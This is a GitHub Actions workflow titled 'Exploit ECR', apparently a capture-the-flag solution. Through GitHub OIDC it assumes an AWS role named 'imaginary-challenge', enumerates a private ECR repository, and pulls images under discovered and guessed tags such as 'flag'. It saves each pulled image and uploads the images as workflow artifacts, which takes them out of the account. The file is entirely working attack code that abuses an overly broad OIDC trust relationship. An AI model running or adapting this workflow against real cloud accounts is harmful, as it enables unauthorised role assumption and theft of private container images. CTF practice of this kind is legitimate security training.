name: Exploit ECR
on:
  push:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  exploit-ecr:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: ctf-ecr-session

      - name: Show caller (sanity)
        run: aws sts get-caller-identity

      - name: Set registry variables
        id: vars
        run: |
          ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
          REGISTRY="${ACCOUNT}.dkr.ecr.ap-east-1.amazonaws.com"
          REPO="challenges/imaginary-challenge"
          echo "REGISTRY=$REGISTRY" >> $GITHUB_ENV
          echo "REPO=$REPO" >> $GITHUB_ENV
          echo "IMAGE_URI=${REGISTRY}/${REPO}" >> $GITHUB_ENV
          aws ecr describe-repositories --repository-names "${REPO}" || true

      - name: Try ECR login
        id: ecr_login
        run: |
          set -x
          # try to get a login password (requires ecr:GetAuthorizationToken)
          if aws ecr get-login-password --region ap-east-1 2>/tmp/ecr_login_err; then
              aws ecr get-login-password --region ap-east-1 | docker login --username AWS --password-stdin "${REGISTRY}"
              echo "LOGIN_OK=true" >> $GITHUB_ENV
          else
              echo "LOGIN_OK=false" >> $GITHUB_ENV
              echo "ECR_LOGIN_ERR=$(cat /tmp/ecr_login_err || true)" >> $GITHUB_ENV
              cat /tmp/ecr_login_err || true
          fi

      - name: Try to list/describe images (enumerate tags)
        id: list_images
        run: |
          set -x
          # attempt to list images / describe images (may be permitted even if pull isn't)
          aws ecr list-images --repository-name "${REPO}" --filter tagStatus=TAGGED 2>&1 | tee /tmp/ecr_list.txt || true
          aws ecr describe-images --repository-name "${REPO}" --output json 2>&1 | tee /tmp/ecr_describe.json || true
          cat /tmp/ecr_list.txt || true
          cat /tmp/ecr_describe.json || true

      - name: Attempt docker pull for plausible tags and save
        run: |
          set -eux
          mkdir -p /tmp/artifacts
          tags_to_try=()
          # extract tags from describe output if present
          if [ -f /tmp/ecr_describe.json ]; then
            tags_from_desc=$(jq -r '.imageDetails[]?.imageTags[]?' /tmp/ecr_describe.json 2>/dev/null || true)
            for t in $tags_from_desc; do
              tags_to_try+=("$t")
            done
          fi
          # common tags to try
          tags_to_try+=("latest" "challenge" "flag" "v1" "demo")

          tried=0
          for tag in "${tags_to_try[@]}"; do
            img="${IMAGE_URI}:${tag}"
            echo "Trying pull: $img"
            if docker pull "$img"; then
              echo "Pulled $img"
              out="/tmp/artifacts/$(echo $tag | tr '/' '_').tar"
              docker save -o "$out" "$img"
              echo "Saved $out"
            else
              echo "Failed pull for $img" || true
            fi
            tried=$((tried+1))
          done

          ls -lah /tmp/artifacts || true

      - name: Upload saved images
        uses: actions/upload-artifact@v4
        with:
          name: ecr-images
          path: /tmp/artifacts/*
